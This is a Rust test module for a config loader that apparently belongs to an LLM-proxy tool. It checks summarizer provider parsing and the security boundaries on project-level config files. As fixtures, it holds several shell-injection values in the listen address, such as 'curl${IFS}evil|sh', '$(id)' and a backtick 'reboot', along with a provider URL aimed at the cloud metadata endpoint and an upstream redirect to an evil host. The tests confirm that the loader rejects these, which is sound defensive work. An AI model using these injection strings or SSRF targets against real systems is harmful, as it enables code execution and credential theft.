        assert!(
            g.providers.is_empty(),
            "gentle mode must not seed providers"
        );
        assert_eq!(
            g.accumulator, base.accumulator,
            "gentle keeps the accumulator on"
        );
        assert_eq!(base.max_summary_segments, 128, "default segment cap is 128");
        assert_eq!(
            g.max_summary_segments, base.max_summary_segments,
            "gentle mode is cadence-only — must not change the segment cap"
        );

        // "default" leaves the validated baseline cadence untouched.
        let mut d = SummarizerConfig::default();
        apply_summarizer_mode(&mut d, "default");
        assert_eq!(d.trigger_bytes, base.trigger_bytes);
        assert_eq!(d.resummarize_after_bytes, base.resummarize_after_bytes);
        assert_eq!(d.keep_recent_turns, base.keep_recent_turns);
    }

    #[test]
    fn summarizer_is_model_free_by_default_and_absent_from_every_profile() {
        // The opt-in summarizer must never be implicitly on: not in Default, not
        // seeded by any profile. `engine = "model-free"` replaces the old
        // `enabled = false`.
        assert_eq!(
            Config::default().summarizer.engine,
            "model-free",
            "default config must have summarizer engine = model-free"
        );
        for name in PROFILES {
            assert_eq!(
                profile_baseline(name).summarizer.engine,
                "model-free",
                "profile {name:?} must not enable the summarizer"
            );
        }
        // Sensible, documented defaults the install template / docs rely on.
        let s = Config::default().summarizer;
        assert_eq!(s.local.endpoint, "http://localhost:11434");
        // The default model must be a P0a+P0b-validated tag, never a disqualified one.
        assert_eq!(s.local.model, "qwen3.5:4b");
        assert_eq!(s.timeout_secs, 180);
        assert_eq!(s.local.keep_alive_secs, 0);
        assert!(s.keep_recent_turns >= 1);
        // Default providers list is empty (no cloud API configured).
        assert!(s.providers.is_empty());
    }

    #[test]
    fn summarizer_full_toml_round_trips() {
        // A complete [summarizer] block with engine=local, a [[summarizer.providers]]
        // entry, and fallback using the provider id parses and re-serializes without loss.
        let toml = r#"
[summarizer]
engine = "local"
fallback = ["openrouter", "model-free"]
mode = "gentle"
trigger_bytes = 409600
slice_char_budget = 98304
accept_ratio = 1.5

[summarizer.local]
endpoint = "http://localhost:11434"
model = "qwen3.5:4b"
keep_alive_secs = 60

[[summarizer.providers]]
id          = "openrouter"
style       = "openai"
base_url    = "https://openrouter.ai/api"
full_url    = "https://api.z.ai/api/paas/v4/chat/completions"
model       = "gpt-4o-mini"
api_key_env = "OPENROUTER_API_KEY"
timeout_secs = 120
"#;
        let cfg: Config = Figment::from(Serialized::defaults(Config::default()))
            .merge(Toml::string(toml))
            .extract()
            .expect("parse");
        assert_eq!(cfg.summarizer.engine, "local");
        assert_eq!(
            cfg.summarizer.fallback,
            vec!["openrouter".to_owned(), "model-free".to_owned()]
        );
        assert_eq!(cfg.summarizer.mode, "gentle");
        assert_eq!(cfg.summarizer.trigger_bytes, 409_600);
        assert_eq!(cfg.summarizer.slice_char_budget, Some(98_304));
        assert_eq!(cfg.summarizer.accept_ratio, 1.5);
        assert_eq!(cfg.summarizer.local.endpoint, "http://localhost:11434");
        assert_eq!(cfg.summarizer.local.model, "qwen3.5:4b");
        assert_eq!(cfg.summarizer.local.keep_alive_secs, 60);
        assert_eq!(cfg.summarizer.providers.len(), 1);
        let p = &cfg.summarizer.providers[0];
        assert_eq!(p.id, "openrouter");
        assert_eq!(p.style, "openai");
        assert_eq!(p.base_url, "https://openrouter.ai/api");
        assert_eq!(
            p.full_url.as_deref(),
            Some("https://api.z.ai/api/paas/v4/chat/completions")
        );
        assert_eq!(p.model, "gpt-4o-mini");
        assert_eq!(p.api_key_env, "OPENROUTER_API_KEY");
        assert_eq!(p.timeout_secs, 120);
        // A partial [summarizer] block (only engine) must not break defaults.
        let partial = "[summarizer]\nengine = \"local\"\n";
        let pcfg: Config = Figment::from(Serialized::defaults(Config::default()))
            .merge(Toml::string(partial))
            .extract()
            .expect("partial parse");
        assert_eq!(pcfg.summarizer.engine, "local");
        assert_eq!(pcfg.summarizer.local.model, "qwen3.5:4b");
        assert_eq!(pcfg.summarizer.fallback, Vec::<String>::new());
    }

    #[test]
    fn summarizer_providers_round_trip_two_entries() {
        // Two [[summarizer.providers]] entries must both deserialize with correct ids.
        let toml = r#"
[summarizer]
engine = "anthropic"
fallback = ["openrouter"]

[[summarizer.providers]]
id          = "anthropic"
style       = "anthropic"
base_url    = "https://api.anthropic.com"
model       = "claude-haiku-4-5"
api_key_env = "ANTHROPIC_API_KEY"
timeout_secs = 30

[[summarizer.providers]]
id          = "openrouter"
style       = "openai"
base_url    = "https://openrouter.ai/api"
model       = "meta-llama/llama-3.1-8b-instruct:free"
api_key_env = "OPENROUTER_API_KEY"
timeout_secs = 45
"#;
        let cfg: Config = Figment::from(Serialized::defaults(Config::default()))
            .merge(Toml::string(toml))
            .extract()
            .expect("parse");
        assert_eq!(cfg.summarizer.providers.len(), 2);
        assert_eq!(cfg.summarizer.providers[0].id, "anthropic");
        assert_eq!(cfg.summarizer.providers[0].style, "anthropic");
        assert_eq!(cfg.summarizer.providers[1].id, "openrouter");
        assert_eq!(cfg.summarizer.providers[1].style, "openai");
        assert_eq!(cfg.summarizer.providers[1].timeout_secs, 45);
    }

    #[test]
    #[allow(clippy::result_large_err)]
    fn duplicate_provider_id_errors_on_load() {
        figment::Jail::expect_with(|jail| {
            jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
            jail.create_file(
                "trimwire.toml",
                r#"
[summarizer]
engine = "anthropic"

[[summarizer.providers]]
id          = "anthropic"
style       = "anthropic"
base_url    = "https://api.anthropic.com"
model       = "claude-haiku-4-5"
api_key_env = "ANTHROPIC_API_KEY"

[[summarizer.providers]]
id          = "anthropic"
style       = "openai"
base_url    = "https://openrouter.ai/api"
model       = "gpt-4o-mini"
api_key_env = "OPENROUTER_API_KEY"
"#,
            )?;
            let err = Config::load().expect_err("duplicate id must error");
            let msg = err.to_string();
            assert!(
                msg.contains("duplicate") && msg.contains("anthropic"),
                "error message must mention duplicate id: {msg}"
            );
            Ok(())
        });
    }

    #[test]
    #[allow(clippy::result_large_err)]
    fn reserved_provider_id_errors_on_load() {
        // A provider id that shadows a reserved engine token ("local"/"model-free")
        // must hard-error — else `engine = "local"` would silently route to the
        // built-in engine and leave the named provider dead.
        figment::Jail::expect_with(|jail| {
            jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
            jail.create_file(
                "trimwire.toml",
                r#"
[summarizer]
engine = "local"

[[summarizer.providers]]
id          = "local"
style       = "openai"
base_url    = "https://openrouter.ai/api"
model       = "gpt-4o-mini"
api_key_env = "OPENROUTER_API_KEY"
"#,
            )?;
            let err = Config::load().expect_err("reserved provider id must error");
            assert!(
                err.to_string().contains("reserved"),
                "error must flag the reserved id: {err}"
            );
            Ok(())
        });
    }

    #[test]
    #[allow(clippy::result_large_err)]
    fn unknown_engine_ref_errors_on_load() {
        figment::Jail::expect_with(|jail| {
            jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
            jail.create_file(
                "trimwire.toml",
                r#"
[summarizer]
engine = "nonexistent-provider"
"#,
            )?;
            let err = Config::load().expect_err("unknown engine ref must error");
            let msg = err.to_string();
            assert!(
                msg.contains("nonexistent-provider"),
                "error message must name the bad token: {msg}"
            );
            Ok(())
        });
    }

    #[test]
    #[allow(clippy::result_large_err)]
    fn unknown_fallback_ref_errors_on_load() {
        figment::Jail::expect_with(|jail| {
            jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
            jail.create_file(
                "trimwire.toml",
                r#"
[summarizer]
engine   = "local"
fallback = ["ghost-provider"]
"#,
            )?;
            let err = Config::load().expect_err("unknown fallback ref must error");
            let msg = err.to_string();
            assert!(
                msg.contains("ghost-provider"),
                "error message must name the bad token: {msg}"
            );
            Ok(())
        });
    }

    #[test]
    fn explicit_knobs_override_the_profile_baseline() {
        // Mirrors load(): the profile is seeded *below* the user's explicit keys,
        // so a hand-set value wins while the rest of the profile stays intact.
        let cfg: Config = Figment::from(Serialized::defaults(profile_baseline("default")))
            .merge(Toml::string(
                "[strategies.bloat_cap]\nthreshold_bytes = 32768",
            ))
            .extract()
            .unwrap();
        assert_eq!(
            cfg.strategies.bloat_cap.threshold_bytes, 32768,
            "explicit key must win over the profile"
        );
        assert_eq!(
            cfg.strategies.image_strip.keep_recent_count, 1,
            "the rest of the default profile stays intact"
        );
        assert_eq!(cfg.profile.as_deref(), Some("default"));
    }

    #[test]
    #[allow(clippy::result_large_err)] // figment::Jail's closure dictates the Result type
    fn load_strips_project_upstream_but_honors_project_profile() {
        // The security boundary: a checked-out project ./.trimwire.toml must not
        // be able to redirect the API token via `upstream`, but it MAY select a
        // pruning profile (harmless). Exercises the real two-pass `load()`.
        figment::Jail::expect_with(|jail| {
            jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
            jail.create_file(
                "trimwire.toml",
                "[server]\nupstream = \"https://api.anthropic.com\"\n",
            )?;
            jail.create_file(
                ".trimwire.toml",
                "profile = \"default\"\n[server]\nupstream = \"http://evil.example\"\n",
            )?;
            let cfg = Config::load().expect("load");
            assert_eq!(
                cfg.server.upstream, "https://api.anthropic.com",
                "project upstream must be stripped"
            );
            assert_eq!(
                cfg.profile.as_deref(),
                Some("default"),
                "project profile applies"
            );
            assert_eq!(
                cfg.strategies.bloat_cap.threshold_bytes, 4_096,
                "the default profile's knobs took effect"
            );
            Ok(())
        });
    }

    #[test]
    #[allow(clippy::result_large_err)] // figment::Jail's closure dictates the Result type
    fn load_strips_project_summarizer_providers() {
        // Security boundary: a checked-out project ./.trimwire.toml must NOT define
        // summarizer providers — base_url/full_url decide where the (opt-in)
        // summarizer POSTs your context slice + which env var holds the key. Only the
        // global config / env may define providers; the global set must survive.
        figment::Jail::expect_with(|jail| {
            jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
            jail.create_file(
                "trimwire.toml",
                "[[summarizer.providers]]\nid = \"good\"\nstyle = \"anthropic\"\n\
                 base_url = \"https://api.anthropic.com\"\nmodel = \"claude-haiku-4-5\"\n\
                 api_key_env = \"ANTHROPIC_API_KEY\"\n",
            )?;
            jail.create_file(
                ".trimwire.toml",
                "[[summarizer.providers]]\nid = \"evil\"\nstyle = \"openai\"\n\
                 full_url = \"http://169.254.169.254/latest/meta-data/\"\nmodel = \"x\"\n\
                 api_key_env = \"HOME\"\n",
            )?;
            let cfg = Config::load().expect("load");
            let ids: Vec<&str> = cfg
                .summarizer
                .providers
                .iter()
                .map(|p| p.id.as_str())
                .collect();
            assert_eq!(
                ids,
                vec!["good"],
                "project-defined providers must be stripped"
            );
            assert!(
                !cfg.summarizer
                    .providers
                    .iter()
                    .any(|p| p.full_url.as_deref().is_some_and(|u| u.contains("169.254"))),
                "the attacker endpoint must not survive into the effective config"
            );
            Ok(())
        });
    }

    #[test]
    #[allow(clippy::result_large_err)] // figment::Jail's closure dictates the Result type
    fn load_rejects_listen_with_control_chars() {
        // A project ./.trimwire.toml that smuggles a newline into `listen` (which is
        // interpolated into generated shell-rc / service files) must be rejected, or
        // it could append extra `export` lines on `trimwire install`.
        figment::Jail::expect_with(|jail| {
            jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
            jail.create_file(
                ".trimwire.toml",
                "[server]\nlisten = \"127.0.0.1:8765\\nexport EVIL=1\"\n",
            )?;
            let cfg = Config::load().expect("load");
            assert_eq!(
                cfg.server.listen, "127.0.0.1:8765",
                "a listen with a newline must revert to the trusted/default value"
            );
            assert!(
                !cfg.server.listen.chars().any(|c| c.is_control()),
                "no control chars survive into listen"
            );
            Ok(())
        });
    }

    #[test]
    #[allow(clippy::result_large_err)] // figment::Jail's closure dictates the Result type
    fn load_rejects_listen_with_shell_metacharacters() {
        // P1-1: a project ./.trimwire.toml `listen` with NO whitespace but shell
        // metacharacters (`;`, `|`, `$`, `${IFS}`, backticks) used to pass the old
        // whitespace/control-only filter and land UNQUOTED in the shell rc on
        // `trimwire install` → arbitrary code execution on next shell. The charset
        // allowlist must reject these and fall back to the trusted/default value.
        for hostile in [
            "127.0.0.1:8765;curl${IFS}evil|sh",
            "127.0.0.1:8765`reboot`",
            "127.0.0.1:8765$(id)",
            "127.0.0.1:8765&whoami",
            // single-quote: the char that would break OUT of the rc export's quoting
            "127.0.0.1:8765'evil'",
        ] {
            figment::Jail::expect_with(|jail| {
                jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
                jail.create_file(
                    ".trimwire.toml",
                    &format!("[server]\nlisten = {hostile:?}\n"),
                )?;
                let cfg = Config::load().expect("load");
                assert_eq!(
                    cfg.server.listen, "127.0.0.1:8765",
                    "hostile listen {hostile:?} must revert to the trusted/default value"
                );
                assert!(
                    !cfg.server.listen.chars().any(|c| matches!(
                        c,
                        ';' | '|' | '$' | '`' | '&' | '(' | ')' | '{' | '}' | '<' | '>'
                    )),
                    "no shell metacharacters survive into listen"
                );
                Ok(())
            });
        }
    }

    #[test]
    #[allow(clippy::result_large_err)] // figment::Jail's closure dictates the Result type
    fn load_accepts_ipv4_and_ipv6_listen() {
        // Valid numeric IP:port values (IPv4, IPv6 brackets, wildcard) must be preserved.
        for ok in ["127.0.0.1:8765", "[::1]:8765", "0.0.0.0:9000", "[::]:8765"] {
            figment::Jail::expect_with(|jail| {
                jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
                jail.create_file(".trimwire.toml", &format!("[server]\nlisten = {ok:?}\n"))?;
                let cfg = Config::load().expect("load");
                assert_eq!(
                    cfg.server.listen, ok,
                    "valid IP:port listen {ok:?} must be preserved"
                );
                Ok(())
            });
        }
    }

    #[test]
    #[allow(clippy::result_large_err)] // figment::Jail's closure dictates the Result type
    fn load_rejects_hostname_listen() {
        // `listen` is a local bind address parsed as a SocketAddr by install/service/run;
        // a hostname passes the charset filter but is NOT a valid SocketAddr, so it must
        // fall back to the default rather than be accepted and silently fail downstream.
        for bad in ["localhost:8765", "my-host_1:9000", "example.com:8765"] {
            figment::Jail::expect_with(|jail| {
                jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
                jail.create_file(".trimwire.toml", &format!("[server]\nlisten = {bad:?}\n"))?;
                let cfg = Config::load().expect("load");
                assert_eq!(
                    cfg.server.listen, "127.0.0.1:8765",
                    "hostname listen {bad:?} must fall back to the default IP:port"
                );
                // And the fallback is itself a valid SocketAddr.
                assert!(cfg.server.listen.parse::<std::net::SocketAddr>().is_ok());
                Ok(())
            });
        }
    }

    #[test]
    #[allow(clippy::result_large_err)] // figment::Jail's closure dictates the Result type
    fn load_revalidates_hostile_trusted_env_listen() {
        // The fallback target (trusted global/env tier) is re-validated too: a hostile
        // TRIMWIRE_SERVER__LISTEN must NOT become the "safe" fallback — it drops to the
        // built-in default. But a VALID env listen IS honored over a hostile project one.
        figment::Jail::expect_with(|jail| {
            jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
            jail.set_env("TRIMWIRE_SERVER__LISTEN", "127.0.0.1:9999;evil");
            jail.create_file(".trimwire.toml", "[server]\nlisten = \"0.0.0.0:1$(x)\"\n")?;
            let cfg = Config::load().expect("load");
            assert_eq!(
                cfg.server.listen, "127.0.0.1:8765",
                "hostile env fallback must drop to the built-in default, not the hostile env value"
            );
            Ok(())
        });
        figment::Jail::expect_with(|jail| {
            jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
            jail.set_env("TRIMWIRE_SERVER__LISTEN", "127.0.0.1:9000");
            jail.create_file(".trimwire.toml", "[server]\nlisten = \"0.0.0.0:1$(x)\"\n")?;
            let cfg = Config::load().expect("load");
            assert_eq!(
                cfg.server.listen, "127.0.0.1:9000",
                "a valid trusted env listen is honored over a hostile project value"
            );
            Ok(())
        });
    }

    #[test]
    #[allow(clippy::result_large_err)] // figment::Jail's closure dictates the Result type
    fn load_trusts_env_upstream_and_falls_back_on_unknown_profile() {
        figment::Jail::expect_with(|jail| {
            jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
            jail.set_env("TRIMWIRE_SERVER__UPSTREAM", "https://trusted.example");
            jail.create_file(".trimwire.toml", "profile = \"bogus\"\n")?;
            let cfg = Config::load().expect("load");
            // Env upstream is trusted (global-tier), so it wins.
            assert_eq!(cfg.server.upstream, "https://trusted.example");
            // Unknown profile falls back to "default" aggressive knobs (threshold 4096).
            assert!(cfg.strategies.bloat_cap.enabled);
            assert_eq!(cfg.strategies.bloat_cap.threshold_bytes, 4_096);
            Ok(())
        });
    }

    #[test]
    fn partial_toml_merges_onto_defaults() {
        // Only override one nested field; everything else stays default.
        let cfg: Config = Figment::from(Serialized::defaults(Config::default()))
            .merge(Toml::string(
                "[strategies.sliding_window]\nenabled = true\nkeep_recent_turns = 8\n",
            ))
            .extract()
            .expect("extract");
        assert!(cfg.strategies.sliding_window.enabled);
        assert_eq!(cfg.strategies.sliding_window.keep_recent_turns, 8);
        // Untouched fields keep their defaults.
        assert_eq!(
            cfg.strategies.sliding_window.stub,
            "[trimwire: elided, older than sliding window]"
        );
        assert_eq!(cfg.server.upstream, "https://api.anthropic.com");
    }

    #[test]
    #[allow(clippy::result_large_err)]
    fn double_v1_base_url_warns_but_still_loads() {
        // An openai-style provider with base_url ending in /v1 must emit a warning
        // but NOT hard-error — the config is still valid, the user just needs to fix
        // the URL. A hard error would be a breaking change for existing configs.
        figment::Jail::expect_with(|jail| {
            jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
            jail.create_file(
                "trimwire.toml",
                r#"
[summarizer]
engine = "openrouter"

[[summarizer.providers]]
id          = "openrouter"
style       = "openai"
base_url    = "https://openrouter.ai/api/v1"
model       = "gpt-4o-mini"
api_key_env = "OPENROUTER_API_KEY"
"#,
            )?;
            // Must load successfully (warning only, not a hard error).
            let cfg = Config::load().expect("double-/v1 base_url must warn but not error");
            assert_eq!(cfg.summarizer.engine, "openrouter");
            let p = &cfg.summarizer.providers[0];
            assert_eq!(p.base_url, "https://openrouter.ai/api/v1");
            Ok(())
        });
    }

    #[test]
    #[allow(clippy::result_large_err)]
    fn unknown_provider_style_errors_on_load() {
        // A provider with a style that is neither "anthropic" nor "openai" must
        // hard-error at load time with a clear message naming the bad style and id.
        figment::Jail::expect_with(|jail| {
            jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
            jail.create_file(
                "trimwire.toml",
                r#"
[summarizer]
engine = "myprovider"

[[summarizer.providers]]
id          = "myprovider"
style       = "gemini"
base_url    = "https://generativelanguage.googleapis.com"
model       = "gemini-flash-2.0"
api_key_env = "GEMINI_API_KEY"
"#,
            )?;
            let err = Config::load().expect_err("unknown style must error");
            let msg = err.to_string();
            assert!(
                msg.contains("gemini"),
                "error must name the bad style value: {msg}"
            );
            assert!(
                msg.contains("myprovider"),
                "error must name the provider id: {msg}"
            );
            assert!(
                msg.contains("anthropic") || msg.contains("openai"),
                "error must mention the valid styles: {msg}"
            );
            Ok(())
        });
    }

    #[test]
    #[allow(clippy::result_large_err)]
    fn empty_base_url_errors_on_load() {
        // A provider with an empty base_url must hard-error at load time.
        figment::Jail::expect_with(|jail| {
            jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
            jail.create_file(
                "trimwire.toml",
                r#"
[summarizer]
engine = "myprovider"

[[summarizer.providers]]
id          = "myprovider"
style       = "openai"
base_url    = ""
model       = "gpt-4o-mini"
api_key_env = "OPENAI_API_KEY"
"#,
            )?;
            let err = Config::load().expect_err("empty base_url must error");
            let msg = err.to_string();
            assert!(
                msg.contains("base_url"),
                "error must mention the missing field: {msg}"
            );
            assert!(
                msg.contains("myprovider"),
                "error must name the provider id: {msg}"
            );
            Ok(())
        });
    }

    #[test]
    #[allow(clippy::result_large_err)]
    fn empty_model_errors_on_load() {
        // A provider with an empty model must hard-error at load time.
        figment::Jail::expect_with(|jail| {
            jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
            jail.create_file(
                "trimwire.toml",
                r#"
[summarizer]
engine = "myprovider"

[[summarizer.providers]]
id          = "myprovider"
style       = "anthropic"
base_url    = "https://api.anthropic.com"
model       = ""
api_key_env = "ANTHROPIC_API_KEY"
"#,
            )?;
            let err = Config::load().expect_err("empty model must error");
            let msg = err.to_string();
            assert!(
                msg.contains("model"),
                "error must mention the missing field: {msg}"
            );
            assert!(
                msg.contains("myprovider"),
                "error must name the provider id: {msg}"
            );
            Ok(())
        });
    }

    // H3 — fallback == engine: warn, not error
    // ──────────────────────────────────────────

    /// A fallback token that duplicates the primary engine is redundant but must
    /// NOT prevent the config from loading.
    #[test]
    #[allow(clippy::result_large_err)]
    fn fallback_equal_to_engine_loads_successfully() {
        figment::Jail::expect_with(|jail| {
            jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
            jail.create_file(
                "trimwire.toml",
                r#"
[summarizer]
engine   = "local"
fallback = ["local", "model-free"]
"#,
            )?;
            // Must load without error even though "local" appears in both engine
            // and the first fallback entry (the duplicate is warned, not rejected).
            let cfg = Config::load().expect("fallback == engine must not hard-error");
            assert_eq!(cfg.summarizer.engine, "local");
            assert_eq!(
                cfg.summarizer.fallback,
                vec!["local".to_owned(), "model-free".to_owned()]
            );
            Ok(())
        });
    }

    /// An unknown fallback token (one that is neither a built-in engine name nor a
    /// configured provider id) must still hard-error — that is the existing gate.
    #[test]
    #[allow(clippy::result_large_err)]
    fn unknown_fallback_token_still_hard_errors() {
        figment::Jail::expect_with(|jail| {
            jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
            jail.create_file(
                "trimwire.toml",
                r#"
[summarizer]
engine   = "local"
fallback = ["totally-unknown"]
"#,
            )?;
            let err = Config::load().expect_err("unknown fallback must error");
            let msg = err.to_string();
            assert!(
                msg.contains("totally-unknown"),
                "error must name the bad token: {msg}"
            );
            Ok(())
        });
    }

    /// Duplicate provider ids are still a hard error even when the fallback == engine
    /// path has been relaxed.
    #[test]
    #[allow(clippy::result_large_err)]
    fn duplicate_provider_ids_still_error_despite_h3_relaxation() {
        figment::Jail::expect_with(|jail| {
            jail.set_env("XDG_CONFIG_HOME", jail.directory().display().to_string());
            jail.create_file(
                "trimwire.toml",
                r#"
[summarizer]
engine = "myp"

[[summarizer.providers]]
id          = "myp"
style       = "anthropic"
base_url    = "https://api.anthropic.com"
model       = "claude-haiku-4-5"
api_key_env = "ANTHROPIC_API_KEY"

[[summarizer.providers]]
id          = "myp"
style       = "openai"
base_url    = "https://api.openai.com"
model       = "gpt-4o-mini"
api_key_env = "OPENAI_API_KEY"
"#,
            )?;
            let err = Config::load().expect_err("duplicate provider ids must still error");
            let msg = err.to_string();
            assert!(
                msg.contains("duplicate") || msg.contains("myp"),
                "error must flag the duplicate: {msg}"
            );
            Ok(())
        });
    }
}
